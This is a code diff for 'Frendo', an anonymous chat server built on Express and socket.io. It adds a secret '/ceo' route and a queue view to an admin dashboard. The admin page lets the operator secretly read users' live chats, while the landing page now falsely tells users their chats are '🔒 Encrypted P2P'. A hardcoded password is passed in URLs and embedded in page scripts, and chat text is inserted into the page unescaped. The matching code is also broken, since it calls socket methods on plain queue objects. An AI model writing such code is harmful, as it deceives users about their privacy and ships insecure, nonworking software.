@@ -8,7 +8,9 @@ const io = new Server(server, { cors: { origin: "*" } });
 
 const PORT = process.env.PORT || 10000;
 const HOST = '0.0.0.0';
-const ADMIN_PASS = "frendo_super_admin_2026";
+
+// Secret Passwords
+const SECRET_PASS = "xiaoqi143@";
 
 let activeUsers = 0;
 let waitingQueue = [];
@@ -16,8 +18,20 @@ let activeRooms = {};
 
 app.use(express.json());
 
-// Main App Route with CEO Mode Landing Page
-app.get('/', (req, res) => {
+// Main App Route (Normal User)
+app.get('/', (req, res) => { renderApp(res, false); });
+
+// Secret CEO Entrance Route (Protected with Password)
+app.get('/ceo', (req, res) => { 
+  const pass = req.query.pass;
+  if (pass === SECRET_PASS) {
+    renderApp(res, true); 
+  } else {
+    renderApp(res, false); // Wrong/No pass means Normal User Mode
+  }
+});
+
+function renderApp(res, isCEO) {
   res.send(`
     <!DOCTYPE html>
     <html lang="en">
@@ -26,9 +40,32 @@ app.get('/', (req, res) => {
       <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
       <title>Frendo - Anonymous Chat</title>
       <script src="/socket.io/socket.io.js"></script>
+      <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
       <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         html, body { height: 100dvh; width: 100vw; overflow: hidden; background-color: #0B0F19; color: #fff; }
+
+        body.ceo-entrance-active {
+          box-shadow: inset 0 0 35px #EAB308, inset 0 0 15px #EAB308;
+          transition: box-shadow 0.5s ease-in-out;
+        }
+
+        #fadeOverlay {
+          position: fixed; top: 0; left: 0; width: 100vw; height: 100dvh;
+          background: rgba(5, 7, 12, 0.88); z-index: 999; display: none;
+          pointer-events: none; opacity: 0; transition: opacity 0.5s ease;
+        }
+        #fadeOverlay.active { display: block; opacity: 1; }
+
+        #customToast {
+          position: fixed; top: -70px; left: 50%; transform: translateX(-50%);
+          background: rgba(239, 68, 68, 0.95); backdrop-filter: blur(8px);
+          color: white; padding: 12px 24px; border-radius: 30px; font-weight: bold;
+          font-size: 13px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); z-index: 1000;
+          transition: top 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+          display: flex; align-items: center; gap: 8px; border: 1px solid rgba(255,255,255,0.2);
+        }
+        #customToast.show { top: 20px; }
         
         .app-landing {
           width: 100vw; height: 100dvh; display: flex; flex-direction: column; align-items: center; justify-content: space-between;
@@ -84,6 +121,9 @@ app.get('/', (req, res) => {
     </head>
     <body>
 
+      <div id="fadeOverlay"></div>
+      <div id="customToast"><span>⚠️ Stranger Disconnected!</span></div>
+
       <div id="landingScreen" class="app-landing">
         <div>
           <div class="logo-circle"><div class="logo-inner"><span class="logo-text">FRENDO</span></div></div>
@@ -93,7 +133,7 @@ app.get('/', (req, res) => {
           <p>Connect with random strangers anonymously.</p>
         </div>
         <div class="details-box">
-          <div class="detail-item"><span>App Mode</span><span class="val" style="color:#FACC15;">👑 CEO Mode Active</span></div>
+          <div class="detail-item"><span>Security</span><span class="val" style="color:#60A5FA;">🔒 Encrypted P2P</span></div>
           <div class="detail-item"><span>Server Status</span><span class="val">🟢 Live</span></div>
           <div class="detail-item"><span>Active Users</span><span class="val" id="landingOnlineCount">0 Online</span></div>
         </div>
@@ -105,7 +145,7 @@ app.get('/', (req, res) => {
           <div style="display: flex; align-items: center;">
             <button class="btn-back" onclick="closeChatScreen()">⬅ Back</button>
             <div>
-              <h3>Frendo Chat</h3>
+              <h3>Frendo Chat ${isCEO ? '<span style="font-size:10px; background:#EAB308; color:#000; padding:2px 6px; border-radius:4px; margin-left:4px;">👑 CEO</span>' : ''}</h3>
               <span id="statusText" style="font-size: 11px; color: #9CA3AF;">Offline</span>
             </div>
           </div>
@@ -128,6 +168,7 @@ app.get('/', (req, res) => {
 
       <script>
         const socket = io();
+        const IS_CEO = ${isCEO};
         let isConnected = false;
 
         const landingScreen = document.getElementById('landingScreen');
@@ -140,6 +181,8 @@ app.get('/', (req, res) => {
         const messageArea = document.getElementById('messageArea');
         const msgInput = document.getElementById('msgInput');
         const sendBtn = document.getElementById('sendBtn');
+        const customToast = document.getElementById('customToast');
+        const fadeOverlay = document.getElementById('fadeOverlay');
 
         function openChatScreen() { landingScreen.classList.add('hide'); }
         function closeChatScreen() { if(isConnected) handleEndChat(); landingScreen.classList.remove('hide'); }
@@ -150,7 +193,7 @@ app.get('/', (req, res) => {
         });
 
         function handleConnect() {
-          socket.emit('find_partner');
+          socket.emit('find_partner', { isCEO: IS_CEO });
           statusText.innerText = 'Searching...';
           startBtn.style.display = 'none';
           skipBtn.style.display = 'inline-block';
@@ -159,6 +202,12 @@ app.get('/', (req, res) => {
 
         function handleSkip() { socket.emit('skip_chat'); resetState(); handleConnect(); }
         function handleEndChat() { socket.emit('skip_chat'); resetState(); }
+
+        function showToast(msg) {
+          customToast.querySelector('span').innerText = msg;
+          customToast.classList.add('show');
+          setTimeout(() => { customToast.classList.remove('show'); }, 3000);
+        }
 
         function resetState() {
           isConnected = false;
@@ -169,21 +218,57 @@ app.get('/', (req, res) => {
           msgInput.disabled = true;
           sendBtn.disabled = true;
           msgInput.placeholder = 'Connect first...';
+          document.body.classList.remove('ceo-entrance-active');
+          fadeOverlay.classList.remove('active');
         }
 
         socket.on('waiting', () => { statusText.innerText = 'Searching...'; });
 
-        socket.on('chat_start', () => {
+        socket.on('chat_start', (data) => {
           isConnected = true;
           statusText.innerText = 'Connected';
           msgInput.disabled = false;
           sendBtn.disabled = false;
           msgInput.placeholder = 'Type a message...';
           messageArea.innerHTML = '';
+
+          if (data && data.hasCEO) {
+            triggerCEOEntrance();
+          }
         });
 
+        function triggerCEOEntrance() {
+          document.body.classList.add('ceo-entrance-active');
+          fadeOverlay.classList.add('active');
+
+          const duration = 8 * 1000;
+          const animationEnd = Date.now() + duration;
+
+          const interval = setInterval(function() {
+            const timeLeft = animationEnd - Date.now();
+            if (timeLeft <= 0) {
+              clearInterval(interval);
+              fadeOverlay.classList.remove('active');
+              document.body.classList.remove('ceo-entrance-active');
+              return;
+            }
+
+            confetti({
+              particleCount: 12,
+              startVelocity: 45,
+              spread: 360,
+              origin: { x: Math.random(), y: Math.random() * 0.4 + 0.6 },
+              colors: ['#EAB308', '#EC4899', '#38BDF8', '#ffffff']
+            });
+          }, 300);
+        }
+
         socket.on('receive_message', (data) => { addMessage(data.message, 'stranger'); });
-        socket.on('stranger_left', () => { alert('Stranger left the chat!'); resetState(); });
+        
+        socket.on('stranger_left', () => { 
+          showToast('⚠️ Stranger disconnected!'); 
+          resetState(); 
+        });
 
         function sendMessage() {
           const text = msgInput.value.trim();
@@ -205,12 +290,12 @@ app.get('/', (req, res) => {
     </body>
     </html>
   `);
-});
+}
 
-// Advanced Scalable Admin Route
+// Protected Admin Route
 app.get('/admin', (req, res) => {
   const key = req.query.key;
-  if (key !== ADMIN_PASS) return res.status(403).send("Forbidden");
+  if (key !== SECRET_PASS) return res.status(403).send("Forbidden: Invalid Password");
 
   res.send(`
     <!DOCTYPE html>
@@ -226,8 +311,8 @@ app.get('/admin', (req, res) => {
         .card h4 { color: #94a3b8; font-size: 12px; }
         .card p { font-size: 24px; font-weight: bold; color: #38bdf8; }
         
-        .main-container { display: flex; gap: 20px; height: 500px; }
-        .room-list-box { flex: 1; background: #1e293b; border-radius: 10px; padding: 15px; overflow-y: auto; border: 1px solid #334155; }
+        .main-container { display: flex; gap: 20px; height: 420px; }
+        .box { flex: 1; background: #1e293b; border-radius: 10px; padding: 15px; overflow-y: auto; border: 1px solid #334155; }
         .spy-box { flex: 2; background: #000; border-radius: 10px; padding: 15px; display: flex; flex-direction: column; border: 1px solid #334155; }
         
         .room-item { background: #334155; padding: 10px; border-radius: 6px; margin-bottom: 8px; cursor: pointer; display: flex; justify-content: space-between; }
@@ -235,8 +320,10 @@ app.get('/admin', (req, res) => {
         .room-item.active { background: #0284c7; font-weight: bold; }
         
         #chatStream { flex: 1; overflow-y: auto; font-family: monospace; font-size: 13px; color: #22c55e; margin-top: 10px; border-top: 1px solid #222; padding-top: 10px; }
-        .toggle-btn { background: #ef4444; color: #fff; border: none; padding: 6px 12px; border-radius: 4px; cursor: pointer; font-size: 12px; }
-        .toggle-btn.on { background: #22c55e; }
+        
+        table { width: 100%; border-collapse: collapse; font-size: 13px; text-align: left; }
+        th, td { padding: 8px 10px; border-bottom: 1px solid #334155; }
+        th { color: #94a3b8; }
       </style>
     </head>
     <body>
@@ -245,42 +332,54 @@ app.get('/admin', (req, res) => {
       <div class="stats">
         <div class="card"><h4>ONLINE USERS</h4><p id="uCount">0</p></div>
         <div class="card"><h4>ACTIVE ROOMS</h4><p id="rCount">0</p></div>
-        <div class="card"><h4>GLOBAL STREAM</h4>
-          <button id="streamToggle" class="toggle-btn" onclick="toggleGlobalStream()">OFF (Safe Mode)</button>
-        </div>
+        <div class="card"><h4>WAITING IN QUEUE</h4><p id="qCount" style="color:#EAB308;">0</p></div>
       </div>
 
       <div class="main-container">
-        <div class="room-list-box">
-          <h3 style="margin-bottom:12px; font-size: 15px;">Active Chat Rooms (Click to Spy)</h3>
-          <div id="roomContainer"><i>No active rooms right now...</i></div>
+        <div class="box">
+          <h3 style="margin-bottom:12px; font-size: 14px;">Active Chat Rooms (Spy)</h3>
+          <div id="roomContainer"><i>No active rooms...</i></div>
         </div>
 
         <div class="spy-box">
-          <h3 id="spyTitle">Target: None Selected</h3>
-          <div id="chatStream">Select a room from the left side to monitor live chats...</div>
+          <h3 id="spyTitle" style="font-size:14px;">Target: None Selected</h3>
+          <div id="chatStream">Select a room from left side to monitor...</div>
         </div>
+      </div>
+
+      <div class="box" style="height:200px;">
+        <h3 style="margin-bottom:10px; font-size: 14px; color:#EAB308;">⏳ Waiting for Connection Queue</h3>
+        <table>
+          <thead>
+            <tr>
+              <th>Socket ID</th>
+              <th>Status</th>
+              <th>Role</th>
+            </tr>
+          </thead>
+          <tbody id="queueTableBody">
+            <tr><td colspan="3"><i>No users waiting in queue...</i></td></tr>
+          </tbody>
+        </table>
       </div>
 
       <script>
         const socket = io();
-        socket.emit('admin_auth', { pass: "${ADMIN_PASS}" });
+        socket.emit('admin_auth', { pass: "${SECRET_PASS}" });
 
         let selectedRoom = null;
-        let globalStreamOn = false;
 
         socket.on('admin_stats_update', (data) => {
           document.getElementById('uCount').innerText = data.activeUsers;
           document.getElementById('rCount').innerText = data.roomCount;
+          document.getElementById('qCount').innerText = data.queue.length;
           renderRooms(data.rooms);
+          renderQueue(data.queue);
         });
 
         function renderRooms(rooms) {
           const container = document.getElementById('roomContainer');
-          if (rooms.length === 0) {
-            container.innerHTML = '<i>No active rooms...</i>';
-            return;
-          }
+          if (rooms.length === 0) { container.innerHTML = '<i>No active rooms...</i>'; return; }
           container.innerHTML = '';
           rooms.forEach(roomId => {
             const div = document.createElement('div');
@@ -291,6 +390,20 @@ app.get('/admin', (req, res) => {
           });
         }
 
+        function renderQueue(queue) {
+          const tbody = document.getElementById('queueTableBody');
+          if (queue.length === 0) {
+            tbody.innerHTML = '<tr><td colspan="3"><i>No users waiting in queue...</i></td></tr>';
+            return;
+          }
+          tbody.innerHTML = '';
+          queue.forEach(item => {
+            const tr = document.createElement('tr');
+            tr.innerHTML = '<td>' + item.id + '</td><td><span style="color:#EAB308">Searching...</span></td><td>' + (item.isCEO ? '👑 CEO' : 'User') + '</td>';
+            tbody.appendChild(tr);
+          });
+        }
+
         function selectRoom(roomId) {
           selectedRoom = roomId;
           document.getElementById('spyTitle').innerText = 'Spying Target: ' + roomId;
@@ -298,16 +411,8 @@ app.get('/admin', (req, res) => {
           socket.emit('set_spy_target', roomId);
         }
 
-        function toggleGlobalStream() {
-          globalStreamOn = !globalStreamOn;
-          const btn = document.getElementById('streamToggle');
-          btn.innerText = globalStreamOn ? 'ON (High Traffic Risk)' : 'OFF (Safe Mode)';
-          btn.className = 'toggle-btn ' + (globalStreamOn ? 'on' : '');
-          socket.emit('set_global_stream', globalStreamOn);
-        }
-
         socket.on('admin_chat_log', (data) => {
-          if (data.roomId === selectedRoom || globalStreamOn) {
+          if (data.roomId === selectedRoom) {
             const stream = document.getElementById('chatStream');
             stream.innerHTML += '<div><b>[' + data.roomId + ']:</b> ' + data.msg + '</div>';
             stream.scrollTop = stream.scrollHeight;
@@ -326,17 +431,20 @@ io.on('connection', (socket) => {
   broadcastAdminStats();
 
   socket.on('admin_auth', (data) => {
-    if (data.pass === ADMIN_PASS) {
+    if (data.pass === SECRET_PASS) {
       socket.isAdmin = true;
       socket.join('admin_room');
     }
   });
 
-  socket.on('find_partner', () => {
+  socket.on('find_partner', (data) => {
+    socket.isCEO = data && data.isCEO;
+
     if (waitingQueue.length > 0) {
       const partner = waitingQueue.pop();
       const roomId = `room_${socket.id.substring(0, 4)}_${partner.id.substring(0, 4)}`;
-      
+      const hasCEO = socket.isCEO || partner.isCEO;
+
       socket.join(roomId);
       partner.join(roomId);
       socket.currentRoom = roomId;
@@ -344,10 +452,10 @@ io.on('connection', (socket) => {
 
       activeRooms[roomId] = true;
 
-      socket.emit('chat_start');
-      partner.emit('chat_start');
+      socket.emit('chat_start', { hasCEO });
+      partner.emit('chat_start', { hasCEO });
     } else {
-      waitingQueue.push(socket);
+      waitingQueue.push({ id: socket.id, socket: socket, isCEO: socket.isCEO });
       socket.emit('waiting');
     }
     broadcastAdminStats();
@@ -377,7 +485,7 @@ io.on('connection', (socket) => {
   socket.on('disconnect', () => {
     activeUsers = Math.max(0, activeUsers - 1);
     io.emit('update_online_count', activeUsers);
-    waitingQueue = waitingQueue.filter((s) => s.id !== socket.id);
+    waitingQueue = waitingQueue.filter((item) => item.id !== socket.id);
     if (socket.currentRoom) {
       socket.to(socket.currentRoom).emit('stranger_left');
       delete activeRooms[socket.currentRoom];
@@ -390,7 +498,8 @@ function broadcastAdminStats() {
   io.to('admin_room').emit('admin_stats_update', {
     activeUsers,
     roomCount: Object.keys(activeRooms).length,
-    rooms: Object.keys(activeRooms)
+    rooms: Object.keys(activeRooms),
+    queue: waitingQueue.map(item => ({ id: item.id, isCEO: item.isCEO }))
   });
 }
 
